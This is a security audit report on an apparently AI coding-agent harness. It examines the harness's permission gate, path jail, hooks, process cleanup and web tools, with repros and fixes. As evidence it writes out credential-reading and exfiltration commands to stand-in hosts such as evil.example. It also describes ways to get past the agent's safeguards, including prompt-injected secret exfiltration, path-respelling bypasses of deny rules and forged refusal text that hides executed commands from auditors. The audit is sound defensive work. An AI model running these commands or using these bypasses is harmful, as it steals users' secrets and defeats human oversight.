# 15c — sugar-crush audit: tool execution and the safety layer

Scope: `src/Tools/` (built-ins, Concerns, PathJail, IgnoreRules, McpToolBridge), `src/Permissions/`, `src/Hooks/`, `src/Support/ProcessContainment.php`, `docs/PERMISSIONS.md`, `docs/HOOKS.md`.
Checkout: master @ `05db616f3`, PHP 8.3.6 CLI, `memory_limit=-1`.
Repro scripts: `/home/sites/crush-research-repos/_audit-scratch/15c/rNN_*.php`. Every repro runs against `.../15c/root` and never against the real repo.

Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings at audit time: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low. Twenty have since been fixed on master (see **Fixed since audit** at the end), so 11 remain: 1 Med-High (F-E2, partly fixed), 5 Medium, 1 Low-Medium, 4 Low. One more was found during wave 2 (F-E4, Info) and one during wave 3 (F-E5, Low), so 13 are open.

> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, and since `c8fc573a5` it describes the fail-closed allow rules that closed F-P5. The real defects in the new matcher were narrower. F-P5 (`$(…)`, backticks and redirection slipping past an allow rule) is now fixed. F-J3 covers path rules missing respellings; it is partly fixed (`3b7d2fd33`, the live hook chain), and the callers that pass no root are still open.

**Relation to the known list (99-synthesis Part II).** Nothing below repeats a known item. Where a finding touches one, the overlap is stated.

---

## A. Tool output and encoding

Every finding here (F-T1 to F-T7) has been fixed, the last (F-T3) in wave 6; see **Fixed since audit**.

---

## B. Path jail and file-protection bypasses

### F-J3 — Path-scoped deny rules miss relative or absolute respellings and symlinks
- **Severity:** Medium. **Confidence:** Verified-by-repro (`r11_rules.php`).
- **Where:** `src/Permissions/PermissionRule.php` `matchesPathSubject()` / `normalisePath()`. Normalisation is lexical only and never anchored to the workspace root. For a pattern starting with `/`, suffix matching is skipped.
- **Failure:** With rule `Read(/proj/secret.txt)` deny, the call `/proj/secret.txt` → Deny, but **`secret.txt` → Allow** and **`./secret.txt` → Allow**. The tools resolve relative paths against `--root`, so all three name the same file. A symlink `notes -> secret.txt` also passes any path deny rule, because realpath is never consulted.
- **Fix:** Before matching, resolve the subject the way the tool will, with `PathJail::resolve($root, $subject)` (the gate needs the root). Match deny rules against both the raw spelling and the resolved spelling, which mirrors what `ProtectFilesHook::pathSpellings()` already does.
- **Test:** A deny rule with an absolute pattern, then calls with a relative, `./`, `sub/../`, and symlink spelling. All must Deny.
- **Partly fixed on master in `3b7d2fd33`.** The root now travels `HookContext::$projectRoot` → `PermissionGateHook` → `PermissionGate::evaluate($call, ?$projectRoot)` → `PermissionRule::matches(…, ?$projectRoot)`. Deny and Ask rules fire on any of the raw spelling, the spelling anchored at the root, and the resolved one (realpath, including a missing leaf or a dangling link), and on a symlinked-root spelling. An Allow rule must match both a plain spelling and the resolved one, so a symlink can narrow a grant but never widen it. `docs/PERMISSIONS.md` describes the new matching. **Remaining:** `AgentManager` (`src/Agents/AgentManager.php:979`), Chat's own gate calls (`src/Chat.php:5432`, `:9187`) and `PermissionGate::refuses()` pass no root, so they keep the old lexical-only matching; `docs/PERMISSIONS.md` notes the gap.

### F-J5 — BashEscapeDenyHook is unwired, trivially bypassed, and denies `> /dev/null`
- **Severity:** Low (dormant). **Confidence:** Verified-by-repro (`r14_escape.php`) plus reading.
- **Where:** `src/Backend/EngineBackend.php:655-666` `withWorktreeRoot()` is its only registration and has **no production caller** (only `tests/Integration/MemoryPromptWiringTest.php:365`). Nothing in `src/` builds an `Agents\PathJail` either (grep shows `worktreeJail:` 0 hits). `Bash.php:28-31` tells callers to rely on this hook for containment.
- **Repro:** Allowed: `cat ~/.ssh/id_rsa`, `cat $HOME/.aws/credentials`, `cat</etc/shadow`, `cd ..;ls`, `echo x >/tmp/out`. **Denied:** `composer test > /dev/null 2>&1` and `/usr/bin/php -v`.
- **Additional defect for when it is wired:** `withWorktreeRoot()` calls `$manager->registerBuiltIns()` and `->register(...)` on the **shared** `$this->hookManager` in place, so the parent backend's chain also gains the worktree-scoped deny. The class's `with*` contract says it should not mutate.
- **Fix (wire, don't remove):** Expand `~`/`$HOME`/`$PWD`/`$OLDPWD`. Split tokens on redirection operators and separators. Allow-list `/dev/null`, `/dev/std*` and absolute *executable* paths in command position. Clone the HookManager before registering.
- **Also needed when worktree isolation is wired (lead 8, confirmed):** Only Bash, Read, Edit and Write accept an `AgentPathJail`. **Glob, Grep and Lsp take no worktree jail parameter at all** (see their constructors), and `Cli/Bootstrap.php:6869/6881` builds them on the main `$root`. Once `isolation: worktree` works (known #23), a sub-agent's Glob/Grep will search the **main checkout**, not its worktree. That is not an escape, but the agent would read stale or foreign files and then Edit paths that do not exist in its own tree. Separately, `Agents\PathJail::jailPath()`/`expandPath()` return absolute paths unchanged. The names promise containment the methods do not provide. They have no callers today, but the next consumer should use `resolve()`.
- **Test:** The table from `r14_escape.php` as a data provider. Add a test asserting the parent backend's hook roster is unchanged after `withWorktreeRoot()`.
- **Partly fixed on master in `586dceec3` + `53b066202`.** `BashEscapeDenyHook` now judges `ShellWords` tokens: redirect targets and separators are split out; `~`, `$HOME` and `$PWD` are expanded, while `$OLDPWD`, `cd -` and `~user` are denied; `$(…)`, backticks, `<(…)`, `sh -c`, `eval` and brace bodies are recursed into, and `--opt=` values are checked. `/dev/null`, `/dev/std*`, `/dev/fd/N`, the random devices and an existing absolute executable in command position are allowed. All eight `r14_escape.php` rows now get the right verdict. `withWorktreeRoot()` registers on a clone of the hook manager (`HookManager::__clone()` copies the registry), so the parent's chain is unchanged. Glob, Grep and `LspTool` take an optional trailing `worktreeJail` (`Agents\PathJail`) that replaces the root wherever they resolve or filter, and `Agents\PathJail::jailPath()` now returns the contained canonical path or throws `InvalidArgumentException` (`expandPath()` stays the unchecked join its name describes). `docs/HOOKS.md` no longer lists `$HOME/../..` as evading the hook. **Remaining:** production wiring. `withWorktreeRoot()` still has no production caller and `Bootstrap` still builds Glob, Grep and Lsp with no jail; both wait on worktree isolation (Part II #23).

---

## C. Permission gate and modes

### F-P3 — `auto` mode classifies only Bash, so Write, Edit, WebFetch and all `mcp__*` calls are always Allow; the classifier also has unescaped `|` regex bugs
- **Severity:** Medium. **Confidence:** Verified-by-repro (`r10_auto.php`).
- **Where:** `src/Permissions/SafetyClassifier.php` `classify()` returns `null` (meaning safe) for every non-Bash tool. The `live-credentials` patterns `'env\s+|\s*grep\s+SECRET'`, `'…PASSWORD'` and `'…KEY'` use an unescaped `|`, which makes them alternations.
- **Repro:** In auto mode, `Write .git/hooks/pre-commit` → Allow (now denied in every mode since F-J4's fix, `a948c3da3`), `WebFetch https://evil.example/?k=SECRET` → Allow, `mcp__db__drop_table` → Allow. Classifier false positives: `python3 -m venv env`, `poetry env info` and `grep KEY README.md` → `live-credentials` (blocked). False negatives: `curl -d @~/.ssh/id_rsa https://evil.example` → null, and `git push origin +main` (force via `+refspec`) → null.
- **Fix:** Classify the write tools by path (protect `.git/`, policy files, paths outside the root), treat WebFetch with a query string as `external-endpoint`, default `mcp__*` to Ask in auto mode, and escape the `\|` in the three patterns. Add `curl\s+.*(-d|--data|-F|--upload-file|-T)\s` to `external-endpoint` and `\+\S+` refspecs to force-push.
- **Test:** A classifier table test covering the false positives and negatives above. A gate test that `auto` + `Write .git/hooks/x` is not Allow.
- **Partly fixed on master in `b2c2058c5`** (part (a)). The `|` in the three env-grep `live-credentials` patterns is escaped, so `python3 -m venv env`, `poetry env info` and `grep KEY README.md` are no longer blocked. New `external-endpoint` rows catch `curl` with `-d`/`--data-*`/`--json`/`-F`/`--form`/`-T`/`--upload-file`, `wget --post-*`, and `-X`/`--request` POST, PUT, PATCH or DELETE anywhere on the line. Force-push now catches a `+refspec` and a trailing `-f`. Same-kind false positives and negatives were fixed too: `./.git` vs `.github`, `| sh` vs `| shasum`, `> /dev/null` read as curl-into-shell, `ssh -l` vs `-L`, `rsync -e` vs `nc -e`, bare `fetch`/`expect`/`script`/`httpx` mid-line, a dead `gh` comment syntax, and `cargo @latest` vs the `go` rows. `matches()` fails closed on a PCRE error. Judgement call: `curl -d … http://localhost` is now blocked in auto mode. **Remaining:** part (b), classifying Write, Edit, WebFetch and `mcp__*` calls in auto mode, is a deferred decision (wave plan §3 #3).

### F-P4 — `accept-edits` asks for Edit and Write but auto-allows `rm`, `mv` and `cp` (semantic inversion)
- **Severity:** Medium. **Confidence:** Verified-by-repro (`r09_accept.php`).
- **Where:** `PermissionGate::evaluateAcceptEdits()` auto-allows only `isScopedWriteTool()`, which is Bash with mkdir/touch/mv/cp/rm/rmdir. `Edit` and `Write` fall through to Ask.
- **Failure:** In the mode named for accepting edits, `Edit a.php` → **Ask**, which is a hard deny in the TUI (known #1), while `Bash rm ./src/Main.php` → **Allow**. The one destructive verb set is granted and the reviewable, diff-previewed tools are refused. That pushes the model toward the opaque Bash route, which `Write.php`'s doc-comment says the tool exists to avoid. PERMISSIONS.md documents the table but never says that Edit and Write are Ask, which is the opposite of what users of the Claude Code `acceptEdits` mode expect.
- **Fix:** Allow `Edit`/`Write` whose resolved path is inside the root and not protected. Consider keeping `rm`/`mv` on Ask.
- **Test:** Gate test: accept-edits + `Edit` (in-root path) → Allow, + `Edit` with an absolute path outside the root → Ask.

### F-P6 — WebFetch is classed "read-only", so data can be sent out in `default`, `plan` and `dont-ask` with no prompt
- **Severity:** Medium. **Confidence:** Verified-by-reading (`PermissionGate::isReadOnlyTool()` lists `WebFetch`; F-P3 repro shows the auto case).
- **Failure:** `dont-ask` is documented as "Deny writes / everything else", yet `WebFetch https://attacker/?d=<base64 of a file Read just returned>` is Allow. Together with F-E1 (provider keys in the Bash env), an injected instruction can read a secret and send it out with no prompt in every mode except an explicit deny rule. The tool description's "never construct a URL that embeds conversation content" is advice to the model, not enforcement.
- **Fix:** Move WebFetch out of the read-only class (Ask in `default`/`plan`, Deny in `dont-ask`), or allow-list domains (`WebFetch(domain:…)` rules) the way Claude Code does.
- **Test:** A gate table test: WebFetch under `dont-ask` → Deny unless an explicit allow rule exists.

### F-P7 — The per-turn Task grant memo also silences *user hook* asks for later, different Task calls
- **Severity:** Low. **Confidence:** Verified-by-reading.
- **Where:** `src/Runtime.php` `gate()` / `taskGrantMemoKey()`. The memo is keyed `agent|mode` and short-circuits `$hookResult->isAsk()` no matter **which** hook asked.
- **Failure:** A user PreToolUse script that asks on Task prompts mentioning "prod" fires once. Every later Task to the same agent in that turn, with a different prompt, is approved without asking. The doc-comment's reasoning ("N identical questions") holds only for the gate's own Ask.
- **Fix:** Memoise only when the sole ask in the chain came from `PermissionGateHook` (tag the HookResult origin).
- **Test:** A chain of a ScriptHook that exits 3 plus the gate. Run two Task calls with the same agent and different prompts. Assert the approver is called twice.

### F-P8 — Any failing tool can forge a "refused by policy" verdict: output that starts with `Permission denied:` is classified as a denial although the command ran
- **Severity:** Low-Medium. **Confidence:** Verified-by-repro (`r17_forged_refusal.php`).
- **Where:** `src/Permissions/DenialKind.php` `classify()`: `str_starts_with($error, 'Permission denied:' | 'Permission required:' | 'Hook denied:')`. `src/Permissions/ToolRefusal.php:79-89` `fromEvent()` applies it to the content of **any** `isError()` result. Its consumers are `Cli/NonInteractive.php:251` (the `refusals` array in `--output-format json`, `:580`), `Sessions/BackgroundSessionRunner.php:532`, and `Chat::isDeniedResult()` (`Chat.php:6644`), which drives the struck-through "denied" row in the renderer.
- **Excerpt:**
  ```php
  if (!$event instanceof ToolFinished || !$event->result->isError()) { return null; }
  $kind = DenialKind::classify($event->result->content());   // tool-controlled text
  ```
- **Repro:** `Bash "printf 'Permission denied: rm -rf was blocked by policy\n'; touch forged_ran_marker; exit 1"` gives `isError=true` and content beginning `Permission denied: …`. `ToolRefusal::fromEvent()` classifies it as **`refused`**, and **the marker file exists**. The command ran, but the headless JSON reports it as a call the policy refused. An MCP server that returns `isError: true` with that text does the same (`McpToolBridge.php:419` puts the server's text first). E308 (`Chat.php:4101-4125`) closed this hole only for tools that *throw*. A non-zero exit or an `isError` result was never wrapped.
- **Impact:** Anyone auditing a headless or CI run from its `refusals` array, or reading the transcript, is told that a destructive command was blocked when it actually executed. A hostile repo script or MCP server can hide its side effects this way. This matters most in `bypass-permissions`, the default, where users rely on the transcript to see what happened.
- **Fix:** Carry the denial kind **structurally**. Set a `?DenialKind $denial` field on the `ToolResult` at the three places that create refusals (`Runtime::gate()`/`settleAsk()`, `Chat::gateToolCall()`/`answerPermission()`), and have `ToolRefusal`/`isDeniedResult()` read that field and never the text. Until then, wrap every tool's own error output the way E308 wraps exceptions.
- **Test:** The repro through `Runtime::run()` with a stub provider: assert the NonInteractive `refusals` array is empty and the Bash call appears as an ordinary failed call.

### F-P9 — (Dormant Chat tool path) "Always allow" is keyed by tool name only and overrides any hook's ASK
- **Severity:** Low (dormant; it becomes Medium the day `Chat::registerTool()` gets a production caller). **Confidence:** Verified-by-reading.
- **Where:** `Chat.php:3052-3055` `answerPermission()`: `$grants[$request->toolCall->name] = true`. `Chat.php:4303` `gateToolCall()`: `return ($this->permissionGrants[$toolCall->name] ?? false) ? [... , null /* no ask */ ...]`, applied to **every** `isAsk()` result, whichever hook raised it.
- **Failure:** The user answers "Always" to `Bash ls`. Every later Bash ask in the session is then auto-approved, whatever the arguments, including asks raised by a user's `hooks.yaml` script (exit 3, "confirm before touching prod") and gate asks for unrelated commands. This is the F-P7 defect again, made broader (session-wide, any arguments), and it is the scope opencode deliberately avoids by keying approvals on patterns.
- **Reachability (lead 5, resolved):** Chat's own tool path runs only when `$this->tools !== []` (`Chat.php:1707`). **No code in `src/` or `bin/` calls `registerTool()`**, so on `bin/sugarcrush` every tool call goes through the engine (`Runtime::gate()`). F-H1 holds identically on this path (`applyPostToolUse()` reads only `additionalContext`, `Chat.php:4420-4437`), and so does F-H3 (`Chat.php:4282`, bare `json_encode`). Both are dormant here.
- **Fix:** Key grants on `(tool, normalised argument pattern)`, and only for asks whose origin is `PermissionGateHook`. Never let a grant answer a user hook's ask.
- **Test:** Using Chat with a registered Bash and a ScriptHook that exits 3: answer "Always" once, then dispatch a different command. Assert the prompt is raised again.

---

## D. Processes and environment

### F-E1 — Bash and every hook inherit the full environment, so provider API keys reach model-visible output
- **Severity:** Medium. **Confidence:** Verified-by-repro (inline `php -r` plus `r13_hook_env.php`).
- **Where:** `src/Support/ProcessContainment.php` `env()`: `$env = \getenv();` strips only `SUDO_ASKPASS`/`GPG_TTY`. It is used by `CapturesProcessOutput::runCaptured()` (Bash, Grep) and `ScriptHook::executeStaged()`. sugar-crush itself reads `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `OPENAI_API_KEY` and `SGLANG_API_KEY` from the env.
- **Repro:** `Bash command="env | grep API_KEY"` returned the planted `OPENAI_API_KEY=sk-FAKE-audit` **and a real third-party API key present in the auditor's shell (value redacted here)**. That is the same exposure a user's session has.
- **Docs contradiction:** `HOOKS.md` §(env table, around line 485 onward) says, "measured", that a hook sees **8-9** variables (`CRUSH_*` + `PWD`) and that `PATH` is not inherited. The actual count is **129 lines**, including `PATH`, `ANTHROPIC_API_KEY` and `GIT_TERMINAL_PROMPT=0`.
- **Distinct from known #34**, which covers the *MCP stdio* env.
- **Fix:** Scrub the env before spawning: drop the provider keys sugar-crush itself consumes plus a configurable denylist (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `AWS_*`), with an allowlist override in settings. Update HOOKS.md.
- **Test:** `putenv('ANTHROPIC_API_KEY=x')`, then `Bash env` → assert absent. A ScriptHook `env` → assert absent. Add a drift test that re-measures the HOOKS.md env table.

### F-E2 — Killing a tool child (deadline or Esc-Esc) orphans the real `bash` process, which keeps running
- **Severity:** Medium-High. **Confidence:** Verified-by-repro (`r02_orphan.php`).
- **Where:** `ProcessContainment::spawnSpec()` wraps every Bash in `setsid -w -- /bin/sh -c …`, which puts it in a **new session and process group**. The kill sites signal only the forked PHP pid: `Runtime.php:2040-2041` `posix_kill($job['pid'], SIGKILL)`, `EngineBackend.php:1411-1412` `posix_kill($pid, SIGKILL)`, and `Chat.php:4760-4761`. Nothing tracks or kills the setsid group.
- **Repro:** Fork, run `Bash "sleep 3; echo survived > orphan_marker"`, then SIGKILL the fork after 0.5 s. `ps` shows the `sh`/`bash`/`sleep` trio reparented to PID 1 in their own SID. Four seconds later, `orphan_marker` contains `survived`.
- **Failure:** The user cancels a turn because the command is wrong (`rm` loop, migration, `git push`), or the 120 s turn deadline fires. The command **finishes anyway**. Servers started by the model live on after the session. This is the "cancel does not cancel" gap. Known #7 covers only the missing timeout.
- **Fix:** Have the PHP child record the setsid child's pgid (`ProcessContainment::groupId()`) in the IPC file or socket frame, and have the parent `posix_kill(-pgid, SIGTERM→SIGKILL)` alongside the pid kill. Alternatively, the child installs a SIGTERM handler that terminates its group, and the parent sends SIGTERM first. `prctl(PR_SET_PDEATHSIG)` is not available from PHP.
- **Sub-agent cascade (lead 6, confirmed by reading):** A Task call is `ParallelSafe` and `ExemptFromParallelDeadline`, so it runs in its own fork under the turn fork, and the deadline sweep skips it (`Runtime.php` phase 3: `|| $job['tool'] instanceof ExemptFromParallelDeadline) continue;`). When the turn fork is killed, the Task fork is reparented. Its only check is `ParentProcessGuard` (`TaskTool.php`, `$orphanGuard` in `onProgress`), and that fires only on the sub-agent's **next** ToolStarted, ToolFinished or reasoning delta. Until then, the sub-agent's in-flight provider request continues. In-flight Bash calls continue as in the repro above. Any parallel group the sub-agent had already forked keeps running too, because `executeConcurrently()`'s `finally` "DELIBERATELY DOES NOT … KILL" an abandoned child. `Write.php:30-39` gives "a cancelled turn could still leave a file on disk the user never approved" as the reason Write must never be ParallelSafe. A parallel Task, which runs Write, Edit and Bash, re-opens exactly that hole one level down.
- **Test:** The repro as a PHPUnit test with the kill pattern from MEMORY (backgrounded pkill watchdog). Assert the marker file does **not** appear within 4 s after the parent kill. Add a sibling test where the Bash runs inside a Task sub-agent.
- **Partly fixed on master in `c54372b2a`** (with 15a B2). New `ProcessContainment::killTree()` freezes the root, walks `/proc` stopping every descendant, then SIGKILLs every member's process group and pid. It is wired into `EngineBackend`'s cancel and idle teardown and into `Runtime`'s parallel-deadline kill, so the setsid'd `bash` dies with the turn, and so does the cascade to parallel Task sub-agents and their own Bash groups and forks. **Remaining:** the dormant `Chat.php` kill site (about `:4783`) is deferred to w7-gate-prov; the `AgentWorkerPool` and `EngineExecutor` fork kill sites still send a single `posix_kill` to the pid, not `killTree()` (since `4fa805970`, 15e WF-1 (a), the pool's new per-agent deadline kill does use `killTree()`; its cancel path, `terminateWorker()`, does not). Also, `killTree()` blocks the event loop for about 110 ms on Escape.

### F-E4 — `ParallelSafe`'s docblock still describes two orphan hazards that B2 and B3 fixed
- **Severity:** Info (doc) · **Confidence:** Verified-by-reading (found during wave 2)
- **Where:** `src/Tools/ParallelSafe.php:57-77`. The paragraph "**An orphaned tool child has no deadline.**" says a SIGKILLed completion child leaves its parallel group with nothing to enforce the deadline. The paragraph "**An orphan also holds the parent's result socket open.**" says forked tool children inherit `$childSocket` because PHP sets no close-on-exec on it, so the TUI sees EOF late.
- **Detail:** both are now false for the live path on Linux. Turn teardown kills the whole process tree, parallel tool children included (`killTree()`, `c54372b2a`, 15a B2). The frame socket ends are `FD_CLOEXEC`, the child closes the parent's end, and the parent notices a dead turn by polling its pid rather than waiting for EOF (`53da0a291`, 15a B3). The first paragraph still holds where `/proc` or ext-posix is missing, because `killTree()` then falls back to killing the root only. The docblock is the contract a new `ParallelSafe` tool author reads, so it now overstates the risk and points at the wrong mitigation.
- **Fix:** rewrite both paragraphs to describe `killTree()` and the close-on-exec frame socket, keeping the no-`/proc` fallback caveat and the "a ParallelSafe tool must terminate on its own" rule.
- **Test:** none needed beyond review. A doc-drift assertion could pin that the docblock names `killTree`.

### F-E5 — `ProcessContainment::interactiveSpawnCommand()` has the same `cd X && cmd` prefix F-E3 fixed in Bash
- **Severity:** Low (latent) · **Confidence:** Verified-by-reading (found while fixing F-E3 in wave 3)
- **Where:** `src/Support/ProcessContainment.php:327-332`: `$script = ($cwd === null || $cwd === '' ? '' : 'cd ' . escapeshellarg($cwd) . ' && ') . $command;`, then `['/bin/sh', '-c', $script]`. Its caller is `CapturesProcessOutput::runCapturedInteractive()` (`:393`).
- **Failure scenario:** `&&` binds tighter than `;`, so with a `$cwd` that no longer exists, `cd X && a; b` runs `b` in the PHP process's cwd, which can be the main checkout rather than an isolated worktree. Bash is not affected: it passes a null `$cwd` and carries its own `cd ROOT || exit 1` prefix since F-E3's fix (`750ffdd13`). Today no production caller passes a `$cwd`, so this is latent until one does.
- **Fix:** use the same `cd X || exit 1` + newline prefix as Bash, ideally from one shared helper so the two cannot drift again.
- **Test:** `interactiveSpawnCommand('true; pwd', '/nonexistent')` run through `/bin/sh` exits non-zero and prints no directory.

---

## E. Hooks and audit

All four findings here (F-H1 to F-H4) were fixed in wave 3; see **Fixed since audit**.

---

## F. WebFetch / WebSearch

### F-W3 — WebSearch: cleartext default endpoint, redirects followed with no address re-check, and the whole body is read before the 5 MB cap applies
- **Severity:** Low. **Confidence:** Verified-by-reading.
- **Where:** `src/Tools/BuiltIn/WebSearch.php:52` default endpoint `http://skynet2.interserver.net:8080/search`. `:247-258` `fetch()` is a bare `file_get_contents($url, …)`, which follows up to 20 redirects (PHP's default) and buffers the full body. `:174` checks `MAX_RESPONSE_SIZE` only afterwards. `targetsBlockedAddress()` checks the **configured endpoint's** first `gethostbyname()` answer, once, and its list lacks even WebFetch's `0.0.0.0/8`.
- **Overlap with known #35:** #35 records that the default endpoint is a private host. The parts that are new: (1) the transport is **plain HTTP**, so every model-composed query, which often quotes code, file names or error text from the user's repo, crosses the network in cleartext to a third-party host, unprompted under the default `bypass-permissions`. (2) A compromised or hijacked endpoint (which plain HTTP makes easy) can 30x-redirect the tool to `169.254.169.254` or any internal address, because nothing re-checks redirect targets the way WebFetch's pinned loop does. That makes a mostly blind SSRF primitive: a GET with side effects. The response reaches the model only if it parses as JSON with SearXNG's keys. Otherwise the tool reports "invalid JSON", which still leaks whether the internal endpoint answered. (3) It can also stream an unbounded body into memory (`memory_limit=-1`).
- **Fix:** Default to `https://` (or to no endpoint, failing loudly per #37). Set `'max_redirects' => 0` / `follow_location => 0` and refuse 3xx. Read through a bounded loop like `WebFetch::transferPinned()`, and reuse WebFetch's resolver, blocklist and pinning for the endpoint.
- **Test:** A `WebSearch` subclass overriding `fetch()` is the existing seam. Add a constructor test that the default endpoint is https, and a stream-level test (loopback fixture) that a 302 is refused.
- **Partly fixed on master in `9c28ac0e8`** (part (a)). Redirects are off: any 3xx is an `isError` refusal naming the code and a bounded, control-stripped `Location`. The body is read in 64 KiB chunks and abandoned past 5 MB. The endpoint is vetted with WebFetch's resolver and blocklist (every DNS answer must pass), the socket dials the vetted IP with Host and SNI set to the hostname, and an endpoint with no host is refused. **Remaining:** (b) the cleartext `http://` default endpoint (`WebSearch.php:64`), a deferred decision.

---

## Summary (sorted by severity)

| ID | Sev | Conf | Title |
|---|---|---|---|
| F-E2 | Med-High | Repro | Cancel or deadline SIGKILLs the PHP child only; setsid'd bash keeps running; Task sub-agents cascade. Partly fixed (`c54372b2a`: tree kill at turn teardown and parallel deadline); remaining: dormant Chat site, `AgentWorkerPool` and `EngineExecutor` kill sites |
| F-J3 | Medium | Repro | Path deny rules miss relative/absolute respellings and symlinks. Partly fixed (`3b7d2fd33`: the live hook chain passes the root; deny/ask match raw, root-anchored, resolved and symlinked-root spellings, allow must match plain and resolved); remaining: `AgentManager`, Chat and `refuses()` pass no root (lexical only) |
| F-P3 | Medium | Repro | auto mode classifies Bash only; classifier `\|` regex bugs. Partly fixed (`b2c2058c5`: regexes escaped, upload/POST and `+refspec` rows, same-kind FP/FN fixes, fail closed on PCRE error); remaining: (b) classify Write/Edit/WebFetch/`mcp__*` (deferred decision) |
| F-P4 | Medium | Repro | accept-edits: Edit/Write Ask but `rm`/`mv`/`cp` Allow |
| F-P6 | Medium | Reading | WebFetch "read-only" → unprompted exfiltration in default/plan/dont-ask |
| F-E1 | Medium | Repro | Bash and hooks inherit provider API keys; HOOKS.md env table wrong |
| F-P8 | Low-Med | Repro | Tool output starting `Permission denied:` is reported as a refusal although the command ran |
| F-J5 | Low | Repro | BashEscapeDenyHook unwired, bypassable, false-positive on `/dev/null`; mutates the shared manager; Glob/Grep/Lsp take no worktree jail. Partly fixed (`586dceec3`, `53b066202`: the hook judges shell words, `/dev/null` and executables allowed, `withWorktreeRoot()` clones the manager, Glob/Grep/Lsp take an optional worktree jail, `Agents\PathJail::jailPath()` enforces containment); remaining: production wiring waits on worktree isolation (Part II #23) |
| F-P7 | Low | Reading | Task grant memo silences user-hook asks |
| F-P9 | Low (dormant) | Reading | Chat-path "Always" grant keyed by tool name overrides any hook ask |
| F-W3 | Low | Reading | WebSearch: cleartext default, unchecked redirects (blind SSRF), unbounded read. Partly fixed (`9c28ac0e8`: 3xx refused, bounded 64 KiB-chunk read abandoned past 5 MB, endpoint vetted with WebFetch's resolver and blocklist and dialled by the vetted IP); remaining: (b) cleartext `http://` default endpoint (deferred decision) |
| F-E5 | Low (latent) | Reading | `interactiveSpawnCommand()` keeps the `cd X && cmd` prefix F-E3 fixed in Bash (no production caller passes a cwd yet) |
| F-E4 | Info (doc) | Reading | `ParallelSafe` docblock still describes the orphan-deadline and inherited-socket hazards fixed by B2 and B3 |

---

## Coverage

**Read end-to-end (code):**
- Tools: `src/Tools/PathJail.php`, `IgnoreRules.php` (including the gitignore→PCRE compiler), `McpToolBridge.php`, `src/ToolRegistry.php` (legacy viewport registry, not on the engine path). Built-ins: `Read`, `Write`, `Edit`, `Bash`, `Grep`, `Glob`, `WebFetch`, `WebSearch`, `SkillTool`, `TaskTool`, `LspTool`, `Doctor`. Concerns: `CapturesProcessOutput`, `BuildsUnifiedDiff`, `TruncatesOutput`.
- Permissions: `PermissionGate`, `PermissionRule`, `SafetyClassifier`, `PermissionMode`, `DenialKind`, `ToolRefusal`, `PermissionDecision`/`Action`/`Reply`/`PromptStage`, `ToolDeclaration`.
- Hooks: `HookRegistry`, `HookManager`, `HookDispatcher` (dormant), `HookConfig`, `HookResult`, `HookContext`, `ScriptHook`. Built-ins: `ProtectFilesHook`, `ConfirmRemoveHook`, `AuditHook`, `BashEscapeDenyHook`, `PermissionGateHook`.
- Support: `ProcessContainment`, `ContainedPath`, `HookContextFiles`, `ParentProcessGuard`. Agents: `PathJail`, `PathJailConfig`, `SuspendedDelegations`.
- Docs: `docs/PERMISSIONS.md` (all), `docs/HOOKS.md` (all).

**Read in part (the parts that bear on this scope):**
- `src/Runtime.php`: `executeConcurrently` 1853-2120 in full, gate 2120-2260, settle 2300-2380, child/IPC 2393-2425, dispatch helpers 2440-2760. `executeSequentially` (~1748) was skimmed only, for the shared gate/settle calls.
- `src/Chat.php`: `beginToolCalls` 2635-2650, `answerPermission` 2972-3070, `gateToolCall`/`applyRewrite`/`applyPostToolUse` 4272-4440, tool IPC 4670-4685, `isDeniedResult` 6644, `registerTool` 6987. `src/Backend/EngineBackend.php`: 640-670, 1395-1430. `src/Cli/Bootstrap.php`: the Chat construction 1190-1300, `hooks()` 4108-4138, tool roster 6860-6900. `src/Cli/NonInteractive.php`: 1205-1260. `candy-mosaic/src/Detect.php`: probe paths.

**Leads from the checkpoint, and how each was resolved:**
1. Provider test expecting `/Malformed UTF-8/`: **resolved**. It pins the throw for caller-supplied `jsonSchema` only. The F-T1 fix note was updated to repair at `settle()` and drop the provider-wide backstop.
2. WebFetch relative `Location` / 3xx returned as success: **confirmed** as F-W2 (repro).
3. CR/LF in the WebFetch URL: **dropped**. `parse_url()` replaces control characters in every component with `_` (measured: `/a\r\nX-Injected: 1` → `/a__X-Injected: 1`), and `Location:` values arrive already split into lines by the wrapper. A space in the path reaches the request line unencoded, but at worst that is a malformed request to the attacker's own host.
4. gitignore ReDoS / fail-open: **confirmed** as F-T5 (repro: 139 s).
5. `Chat::gateToolCall()` parity: **resolved**. That path is unreachable from `bin/sugarcrush` (no `registerTool()` caller). F-H1 and F-H3 apply there too, but dormant. It adds F-P9.
6. Task orphan cascade: **confirmed by reading**, folded into F-E2.
7. Write/Edit atomicity: **confirmed by reading** as F-T7.
8. Glob/Grep without a worktree jail: **confirmed by reading**, folded into F-J5 (Lsp is also affected).
- F-H3's pending impact check: **confirmed** (`r18_hook_slash.php`) and the severity raised to Low-Medium. The `{}` arm is not model-reachable.

**Checked and found sound (no finding):**
- `PathJail::resolve`/`resolveForCreate`/`resolveDir`, `ContainedPath::within`/`below`, and `Agents\PathJail` (which delegates to them).
- WebFetch's DNS pinning: one resolution, every answer checked, the literal dialled, SNI and Host kept on the name, every hop re-checked, non-http(s) redirects refused. Only the range list is short (F-W1).
- `SuspendedDelegations`: id regex, `0600` files, `unserialize` with a class allow-list, and an owner/mode-verified directory. A foreign-owned `/tmp/sugarcrush-suspended-delegations` or `/tmp/sc-hook-ctx` disables resume and context retention, failing closed. That is DoS only.
- `HookContextFiles::bound()`: UTF-8-safe cut, `0600` plus rename, symlink/owner/mode refusal. Note: retained files are never deleted, by design (HOOKS.md), and can hold tool output containing secrets in the user's temp directory.
- `TruncatesOutput`: the `mb_strcut` cuts are UTF-8-safe on valid input, and the markers carry exact byte counts. It does not repair invalid input, which is F-T1's job.
